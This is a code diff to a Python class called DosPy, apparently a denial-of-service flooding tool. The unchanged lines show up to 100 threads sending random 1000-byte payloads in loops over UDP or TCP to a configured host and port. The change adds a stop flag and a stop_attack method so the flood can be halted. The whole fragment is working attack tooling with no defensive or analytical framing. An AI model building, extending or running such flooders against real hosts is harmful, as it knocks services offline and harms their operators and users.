@@ -11,6 +11,7 @@ class DosPy(object):
         self._threads_num = 100
         self._bytes_num = secrets.token_bytes(1000)
 
+        self._stop_thread = False
         self._default_protocol = socket.SOCK_DGRAM
 
     def set_config(self, threads_num: int = 100, bytes_num: int = 1000) -> None:
@@ -43,7 +44,7 @@ class DosPy(object):
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             address = (self._host, self._port)
 
-            while True:
+            while self._stop_thread is False:
                 sock.sendto(self._bytes_num, address)
         elif self._default_protocol == socket.SOCK_STREAM:
             address = (self._host, self._port)
@@ -51,7 +52,7 @@ class DosPy(object):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect(address)
 
-            while True:
+            while self._stop_thread is False:
                 try:
                     sock.send(self._bytes_num)
                 except OSError:
@@ -65,6 +66,9 @@ class DosPy(object):
             th.start()
 
         return True
+
+    def stop_attack(self) -> None:
+        self._stop_thread = True
 
 
 if __name__ == '__main__':
